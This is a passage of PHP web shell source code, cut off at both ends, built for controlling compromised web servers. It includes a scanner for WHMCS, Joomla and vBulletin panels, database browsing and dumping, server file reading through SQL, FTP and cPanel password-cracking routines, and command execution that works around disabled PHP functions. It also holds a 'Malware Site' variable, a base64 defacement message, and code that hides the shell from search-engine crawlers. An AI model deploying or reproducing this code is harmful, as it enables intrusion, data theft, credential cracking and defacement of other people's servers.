$IIIIIIII1I1I=" <a href='".$IIIIIIIIl11l."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIIIl1lI,'200')  == true)
{
$IIIIIIII1I1I =" <a href='".$IIIIIIIIl1I1."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIIIl11I,'200')  == true)
{
$IIIIIIII1I1I =" <a href='".$IIIIIIIIl1ll."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIIIlIll,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIlII1."' target='_blank'>Joomla</a>";
}
elseif (strpos($IIIIIIIIlI1l,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIlIl1."' target='_blank'>Joomla</a>";
}
elseif (strpos($IIIIIIIIllIl,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIlI11."' target='_blank'>vBulletin</a>";
}
elseif (strpos($IIIIIIIIllll,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIllI1."' target='_blank'>vBulletin</a>";
}
elseif (strpos($IIIIIIIIll1l,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIlll1."' target='_blank'>vBulletin</a>";
}
else
{
continue;
}
$IIIIIIII1I1l = $IIIIIIIII1I1['name'] ;
echo '<tr><td><a href=http://www.'.$IIIIIIIIIl11[1][0].'/>'.$IIIIIIIIIl11[1][0].'</a></td>
<td>'.$IIIIIIII1I1I.'</td></tr>';flush();
}
}
}
}
echo "</center></table>";   
    
 }
    
    echo "</div>";
    madfooter();
    
}    


function madsql()
{
    
    
    class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this->type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this->res = @pg_query($this->link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this->res;
			switch($this->type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this->type)	{
				case 'mysql':
                        return $this->query("SHOW databases");
				break;
				case 'pgsql':
					return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = $this->query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
				break;
			}
			return false;
		}
		function error() {
			switch($this->type)	{
				case 'mysql':
					return @mysql_error();
				break;
				case 'pgsql':
					return @pg_last_error();
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this->link);
					else
						$this->query('SET CHARSET '.$str);
					break;
				case 'pgsql':
					return @pg_set_client_encoding($this->link, $str);
					break;
			}
			return false;
		}
		function loadFile($str) {
			switch($this->type)	{
				case 'mysql':
					return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
				break;
				case 'pgsql':
					$this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;");
					$r=array();
					while($i=$this->fetch())
						$r[] = $i['file'];
					$this->query('drop table wso2');
					return array('file'=>implode("\n",$r));
				break;
			}
			return false;
		}
		function dump($table, $fp = false) {
			switch($this->type)	{
				case 'mysql':
					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					$sql = $create[1].";\n";
                    if($fp) fwrite($fp, $sql); else echo($sql);
					$this->query('SELECT * FROM `'.$table.'`');
                    $head = true;
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
                            if($v == null)
                                $item[$k] = "NULL";
                            elseif(is_numeric($v))
                                $item[$k] = $v;
                            else
                                $item[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
                            $sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
                            $head = false;
                        } else
                            $sql = "\n\t,(".implode(", ", $item).')';
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
                    if(!$head)
                        if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
				break;
				case 'pgsql':
					$this->query('SELECT * FROM '.$table);
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
							$item[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if(@$_POST['p2']=='download') {
		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db->selectdb($_POST['sql_base']);
        switch($_POST['charset']) {
            case "Windows-1251": $db->setCharset('cp1251'); break;
            case "UTF-8": $db->setCharset('utf8'); break;
            case "KOI8-R": $db->setCharset('koi8r'); break;
            case "KOI8-U": $db->setCharset('koi8u'); break;
            case "cp866": $db->setCharset('cp866'); break;
        }
        if(empty($_POST['file'])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=dump.sql");
            header("Content-Type: text/plain");
            foreach($_POST['tbl'] as $v)
				$db->dump($v);
            exit;
        } elseif($fp = @fopen($_POST['file'], 'w')) {
            foreach($_POST['tbl'] as $v)
                $db->dump($v, $fp);
            fclose($fp);
            unset($_POST['p2']);
        } 
	}
	madhead();
	echo "
<div class=header>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><select name='type'><option value='mysql' ";
    if(@$_POST['type']=='mysql')echo 'selected';
echo ">MySql</option><option value='pgsql' ";
if(@$_POST['type']=='pgsql')echo 'selected';
echo ">PostgreSql</option></select></td>
<td><input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
<td><input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'></td>
<td><input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
	$tmp = "<input type=text name=sql_base value=''>";
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db->setCharset('cp1251'); break;
				case "UTF-8": $db->setCharset('utf8'); break;
				case "KOI8-R": $db->setCharset('koi8r'); break;
				case "KOI8-U": $db->setCharset('koi8u'); break;
				case "cp866": $db->setCharset('cp866'); break;
			}
			$db->listDbs();
			echo "<select name=sql_base><option value=''></option>";
			while($item = $db->fetch()) {
				list($key, $value) = each($item);
				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
			}
			echo '</select>';
		}
		else echo $tmp;
	}else
		echo $tmp;
	echo "</td>
				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
			</tr>
		</table>
		<script>
            s_db='".@addslashes($_POST['sql_base'])."';
            function fs(f) {
                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                    if(f.p1) f.p1.value='';
                    if(f.p2) f.p2.value='';
                    if(f.p3) f.p3.value='';
                }
            }
			function st(t,l) {
				d.sf.p1.value = 'select';
				d.sf.p2.value = t;
                if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
			}
		</script>";
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				while($item = $db->fetch($tbls_res)) {
					list($key, $value) = each($item);
                    if(!empty($_POST['sql_count']))
                        $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
				}
				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
                    $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
					$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
					$num = $db->fetch();
					$pages = ceil($num['n'] / 30);
                    echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
                    echo " of $pages";
                    if($_POST['p3'] > 1)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>";
                    if($_POST['p3'] < $pages)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>";
                    $_POST['p3']--;
					if($_POST['type']=='pgsql')
						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "<br><br>";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					$db->query(@$_POST['p2']);
					if($db->res !== false) {
						$title = false;
						echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
						$line = 1;
						while($item = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($item as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($item);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
							echo '<tr class="l'.$line.'">';
							$line = $line==1?2:1;
							foreach($item as $key => $value) {
								if($value == null)
									echo '<td><i>null</i></td>';
								else
									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
					} else {
						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
					}
				}
				echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
                if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
                    echo htmlspecialchars($_POST['p2']);
                echo "</textarea><br/><input type=submit value='Execute'>";
				echo "</td></tr>";
			}
			echo "</table></form><br/>";
            if($_POST['type']=='mysql') {
                $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                if($db->fetch())
                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
            }
			if(@$_POST['p1'] == 'loadfile') {
				$file = $db->loadFile($_POST['p2']);
				echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
			}
	} else {
        echo htmlspecialchars($db->error());
    }
	echo '</div>';
    madfooter();
    
 }
 
 function madselfrm()
 {
    
    if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', 'index.php')))
			die('Shell has been removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        madhead();
	echo "<div class=header><pre class=ml1 style='margin-top:5px'>";
    
    
    echo "
    
                /^\
       _.-`:   /   \   :'-._
     ,`    :  |     |  :    '.
   ,`       \,|     |,/       '.
  /           `-...-`           \
 :              .'.              :
 |             . ' .             |
 |             ' . '             |
 :              '.'              :
  \           ,-'''-,           /
   `.       /'|     |'\       ,'
     `._   ;  |     |  ;   _,'
        `-.:  |     |  :,-'
              |     |
              |     |
              |     |
              |     |
              |     |
";
    
    
    
    echo '<br>Kill Me?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	madFooter();
    
 }


if( empty($_POST['a']) )
	if(isset($default_action) && function_exists('mad' . $default_action))
		$_POST['a'] = $default_action;
	else
		$_POST['a'] = 'FilesMan';
if( !empty($_POST['a']) && function_exists('mad' . $_POST['a']) )
	call_user_func('mad' . $_POST['a']);
	exit;}
elseif(isset($_SESSION['shellv2'])){

$user = "9ef4410bacc37b588e4e20ccda60ed108e2a672f8bc54aed952664f1fe31544d";
$pass = "3dbf1df1b77148ed47e55f3da14507f20f492aed20894f58d7c016e7c74d2ea1";

$malsite = "http://fightagent.ru";  // Malware Site
$ind = "WW91IGp1c3QgZ290IGhhY2tlZCAhISEhIQ=="; // "Deface Page" Base64 encoded "You Just Got Hacked !!" (It's legit)
@set_magic_quotes_runtime(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);

if(!empty($_SERVER['HTTP_USER_AGENT'])) 
{
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit; }
}
// Dump Database
if($_GET["action"] == "dumpDB")
{
	$self=$_SERVER["PHP_SELF"];
	if(isset($_COOKIE['dbserver']))
	{
		$date = date("Y-m-d");
		$dbserver = $_COOKIE["dbserver"];
		$dbuser = $_COOKIE["dbuser"];
		$dbpass = $_COOKIE["dbpass"];
		$dbname = $_GET['dbname'];
		$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
		
		$file = "Dump-$dbname-$date";
		
		$file="Dump-$dbname-$date.sql";
		$fp = fopen($file,"w");
		
		function write($data) 
		{
			global $fp;
			
				fwrite($fp,$data);
			
		}
		mysql_connect ($dbserver, $dbuser, $dbpass);
		mysql_select_db($dbname);
		$tables = mysql_query ("SHOW TABLES");
		while ($i = mysql_fetch_array($tables)) 
		{
			$i = $i['Tables_in_'.$dbname];
			$create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
			write($create['Create Table'].";");
			$sql = mysql_query ("SELECT * FROM ".$i);
			if (mysql_num_rows($sql)) {
				while ($row = mysql_fetch_row($sql)) {
					foreach ($row as $j => $k) {
						$row[$j] = "'".mysql_escape_string($k)."'";
					}
					write("INSERT INTO $i VALUES(".implode(",", $row).");");
				}
			}
		}
		
		fclose ($fp);
		
		header("Content-Disposition: attachment; filename=" . $file);   
		header("Content-Type: application/download");
		header("Content-Length: " . filesize($file));
		flush();
		
		$fp = fopen($file, "r");
		while (!feof($fp))
		{
			echo fread($fp, 65536);
			flush();
		} 
		fclose($fp); 
	}
}
function shellstyle()
{
	echo "<style type=\"text/css\">
<!--

body,td,th {
	color: #FF0000;
	font-size: 14px;
}
input.but {
    background-color:#000000;
    color:#FF0000;
    border : 1px solid #1B1B1B;
}
a:link {
	color: #00FF00;
	text-decoration:none;
	font-weight:500;
}
a:hover {
	color:#00FF00;
	text-decoration:underline;
}
font.txt
{
	color: #00FF00;
	text-decoration:none;
	font-size:14px;
}
font.mainmenu
{
	color:#FF0000;
	text-decoration:none;
	font-size:14px;
}
a:visited {
	color: #006600;
}
input.box
{
    background-color:#0C0C0C;
    color: lime;
    border : 1px solid #1B1B1B;
	-moz-border-radius:6px;
	width:400;
	border-radius:6px;
}
input.sbox
{
    background-color:#0C0C0C;
    color: lime;
    border : 1px solid #1B1B1B;
	-moz-border-radius:6px;
	width:180;
	border-radius:6px;
}
select.sbox
{
    background-color:#0C0C0C;
    color: lime;
    border : 1px solid #1B1B1B;
	-moz-border-radius:6px;
	width:180;
	border-radius:6px;
}
select.box
{
    background-color:#0C0C0C;
    color: lime;
    border : 1px solid #1B1B1B;
	-moz-border-radius:6px;
	width:400;
	border-radius:6px;
}

textarea.box
{
    border : 3px solid #111;
    background-color:#161616;
    color : lime;
    margin-top: 10px;
	-moz-border-radius:7px;
	border-radius:7px;
}
body {
	background-color:#000000;
}
.myphp table
{ 
	width:100%;
	padding:18px 10px;
	border : 1px solid #1B1B1B;
} 
.myphp td
{ 
	background:#111111; 
	color:#00ff00; 
	padding:6px 8px; 
	border-bottom:1px solid #222222;
	font-size:14px; 
} 
.myphp th, th
{ 
	background:#181818; 
	
} 
-->
</style>";
}
if(isset($_COOKIE['hacked']) && $_COOKIE['hacked']==md5($pass))
{
	$self=$_SERVER["PHP_SELF"];
	$os = "N/D";
	$bdmessage = null;
	$dir = getcwd();
	
	if(stristr(php_uname(),"Windows"))
	{
		$SEPARATOR = '\\';
		$os = "Windows";
		$directorysperator="\\";
	}
	else if(stristr(php_uname(),"Linux"))
	{
		$os = "Linux";
		$directorysperator='/';
	}
	function Trail($d,$directsperator)
	{
		$d=explode($directsperator,$d);
		array_pop($d);
		array_pop($d);
		$str=implode($d,$directsperator);
		return $str;
	}
	
	function ftp_check($host,$user,$pass,$timeout)
	{
	 $ch = curl_init();
	 curl_setopt($ch, CURLOPT_URL, "ftp://$host");
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	 curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
	 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
	 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	 $data = curl_exec($ch);
	 if ( curl_errno($ch) == 28 )
	 {
	 print "<center><b>
	 Error : Connection Timeout. 
	 Please Check The Target Hostname .</b></center>";exit;
	 }
	 else if ( curl_errno($ch) == 0 )
	 {
	  print "<center><b>[~]</b><font class=txt>
	 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
	 and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b></center><br><br>";
	 }
	 curl_close($ch);
	}
	
	function cpanel_check($host,$user,$pass,$timeout)
	{
	 global $cpanel_port;
	 $ch = curl_init();
	 curl_setopt($ch, CURLOPT_URL, "http://$host:" . $cpanel_port);
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
	 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	 $data = curl_exec($ch);
	 if ( curl_errno($ch) == 28 )
	 { print "<center><b>Error : Connection Timeout. 
	  Please Check The Target Hostname.</b></center>";exit;}
	  else if ( curl_errno($ch) == 0 ){
	  print "<ecnter><b>[~]</b><font class=txt><b>

	 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
	and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b></center><br><br>";
	 }
	 curl_close($ch);
	}

	// Database functions
	function listdatabase()
	{	
		$self=$_SERVER["PHP_SELF"];
		?>
		<br>
		<form>
		<table>
			<tr>
				<td><input type="text" class="box" name="dbname"></td>
				<td><input type="button" onClick="viewtables('createDB',dbname.value)" value="  Create Database  " class="but"></td>
			</tr>
			</table>
		</form>
			<br>
		<?php 
		$mysqlHandle = mysql_connect ($_COOKIE['dbserver'], $_COOKIE['dbuser'], $_COOKIE['dbpass']);
		$result = mysql_query("SHOW DATABASE"); 
		echo "<table cellspacing=1 cellpadding=5 border=1 style=width:60%;>\n";

		$pDB = mysql_list_dbs( $mysqlHandle );
		$num = mysql_num_rows( $pDB );
		for( $i = 0; $i < $num; $i++ ) 
		{
			$dbname = mysql_dbname( $pDB, $i );
			mysql_select_db($dbname,$mysqlHandle);
			$result = mysql_query("SHOW TABLES"); 
			$num_of_tables = mysql_num_rows($result);
			echo "<tr>\n";
			echo "<td><a href=# onClick=\"viewtables('listTables','$dbname')\"><font  size=3>$dbname</font></a> ($num_of_tables)</td>\n";
			echo "<td><a href=# onClick=\"viewtables('listTables','$dbname')\">Tables</a></td>\n";
			echo "<td><a href=# onClick=\"viewtables('dropDB','$dbname')\">Drop</a></td>\n";
			echo "<td><a href='$self?action=dumpDB&dbname=$dbname' onClick=\"return confirm('Dump Database \'$dbname\'?')\">Dump</a></td>\n";
			echo "</tr>\n";
		}
		echo "</table>\n";
		mysql_close($mysqlHandle);
	}
	
	function listtable()
	{
		$self=$_SERVER["PHP_SELF"];
		$dbserver = $_COOKIE["dbserver"];
		$dbuser = $_COOKIE["dbuser"];
		$dbpass = $_COOKIE["dbpass"];
		$dbname = $_GET['dbname'];
		echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";
		 ?>
		<br><br>
		<form>
		<table>

			<tr>
				<td><input type="text" class="box" name="tablename"></td>
				<td><input type="button" onClick="viewtables('createtable','<?php echo $_GET['dbname'];?>')" value="  Create Table  " name="createmydb" class="but"></td>
			</tr>
			</table>
		
			<br>
			<form>
			<table>
				<tr>
					<td><textarea cols="60" rows="7" name="executemyquery" class="box">Execute Query..</textarea></td>
				</tr>
				<tr>
					<td><input type="button" onClick="viewtables('executequery','<?php echo $_GET['dbname'];?>','<?php echo $_GET['tablename']; ?>','','',executemyquery.value)" value="Execute" class="but"></td>
				</tr>
			</table>
			</form>
			
		<?php 
		
		$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
		
		mysql_select_db($dbname);
		$pTable = mysql_list_tables( $dbname );
	
		if( $pTable == 0 ) {
			$msg  = mysql_error();
			echo "<h3>Error : $msg</h3><p>\n";
			return;
		}
		$num = mysql_num_rows( $pTable );
	
		echo "<table cellspacing=1 cellpadding=5 border=1 style=width:60%;>\n";
	
		for( $i = 0; $i < $num; $i++ ) 
		{
			$tablename = mysql_tablename( $pTable, $i );
			$result = mysql_query("select * from $tablename");
			$num_rows = mysql_num_rows($result);
			echo "<tr>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('viewdata','$dbname','$tablename')\"><font  size=3>$tablename</font></a> ($num_rows)\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('viewSchema','$dbname','$tablename')\">Schema</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('viewdata','$dbname','$tablename')\">Data</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('empty','$dbname','$tablename')\">Empty</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('dropTable','$dbname','$tablename')\">Drop</a>\n";
			echo "</td>\n";
			echo "</tr>\n";
		}
	
		echo "</table></form>";
		mysql_close($mysqlHandle);
		echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";
	}
		
	
	function paramexe($n, $v) 
	{
		$v = trim($v);
		if($v) 
		{
			echo '<span><font  size=3>' . $n . ': </font></span>';
			if(strpos($v, "\n") === false)
				echo '<font  size=2>' . $v . '</font><br>';
			else
				echo '<pre class=ml1><font class=txt size=3>' . $v . '</font></pre>';
		}
	}
	
	
	
	function rrmdir($dir)
	{
		if (is_dir($dir)) // ensures that we actually have a directory
		{
			$objects = scandir($dir); // gets all files and folders inside
			foreach ($objects as $object)
			{
				if ($object != '.' && $object != '..')
				{
					if (is_dir($dir . '/' . $object))
					{
						// if we find a directory, do a recursive call
						rrmdir($dir . '/' . $object);
					}
					else
					{
						// if we find a file, simply delete it
						unlink($dir . '/' . $object);
					}
				}
			}
			// the original directory is now empty, so delete it
			rmdir($dir);
		}
	} 
					
	function which($pr)
	{ 
		$path = execmd("which $pr"); 
		if(!empty($path)) 
			return trim($path); 
		else 
			return trim($pr); 
	}
	
	function magicboom($text)
	{ 
		if (!get_magic_quotes_gpc()) 
			return $text; 
		return stripslashes($text); 
	}
	
function execmd($cmd,$d_functions="None")
{
    if($d_functions=="None") 
	{
		$ret=passthru($cmd); 
		return $ret;
	}
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    $d_functions=str_replace(" ","",$d_functions);
    $dis_funcs=explode(",",$d_functions);
    foreach($funcs as $safe)
    {
        if(!in_array($safe,$dis_funcs)) 
        {
            if($safe=="exec")
            {
                $ret=@exec($cmd);
                $ret=join("\n",$ret);
                return $ret;
            }
            elseif($safe=="system")
            {
                $ret=@system($cmd);
                return $ret;
            }
            elseif($safe=="passthru")
            {
                $ret=@passthru($cmd);
                return $ret;
            }
            elseif($safe=="shell_exec")
            {
                $ret=@shell_exec($cmd);
                return $ret;
            }
            elseif($safe=="popen")
            {
                $ret=@popen("$cmd",'r');
                if(is_resource($ret))
                {
                    while(@!feof($ret))
                    $read.=@fgets($ret);
                    @pclose($ret);
                    return $read;
                }
                return -1;
            }
            elseif($safe="proc_open")
            {
                $cmdpipe=array(
                0=>array('pipe','r'),
                1=>array('pipe','w')
                );
                $resource=@proc_open($cmd,$cmdpipe,$pipes);
                if(@is_resource($resource))
                {
                    while(@!feof($pipes[1]))
                    $ret.=@fgets($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($resource);
                    return $ret;
                }
                return -1;
            }
        }
    }
    return -1;
}

	function getDisabledFunctions()
	{
		if(!ini_get('disable_functions'))
		{
			return "None";
		}
		else
		{
				return @ini_get('disable_functions');
		}
	}
	
	function getFilePermissions($file)
	{
	$perms = fileperms($file);
	
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} else {
		// Unknown
		$info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
				(($perms & 0x0800) ? 's' : 'x' ) :
				(($perms & 0x0800) ? 'S' : '-'));
	
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
				(($perms & 0x0400) ? 's' : 'x' ) :
				(($perms & 0x0400) ? 'S' : '-'));
	
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
				(($perms & 0x0200) ? 't' : 'x' ) :
				(($perms & 0x0200) ? 'T' : '-'));
	
	return $info;
}
	function filepermscolor($filename)
	{
		if(!@is_readable($filename)) 
			return "<font color=\"#FF0000\">".getFilePermissions($filename)."</font>"; 
		else if(!@is_writable($filename)) 
			return "<font color=\"#FFFFFF\">".getFilePermissions($filename)."</font>";
		else
			return "<font color=\"#00FF00\">".getFilePermissions($filename)."</font>";
	}

	function yourip()
	{
		echo $_SERVER["REMOTE_ADDR"];
	}
	function phpver()
	{
		$pv=@phpversion();
		echo $pv;
	}
	function magic_quote()
	{
		echo get_magic_quotes_gpc()?"<font class=txt>ON</font>":"<font color='red'>OFF</font>";
	}
	function serverip()
	{
		echo getenv('SERVER_ADDR');
	}
	function serverport()
	{
		echo $_SERVER['SERVER_PORT'];
	}
	function  safe()
	{
		global $sm;
		return $sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF";
	}
	function serveradmin()
	{
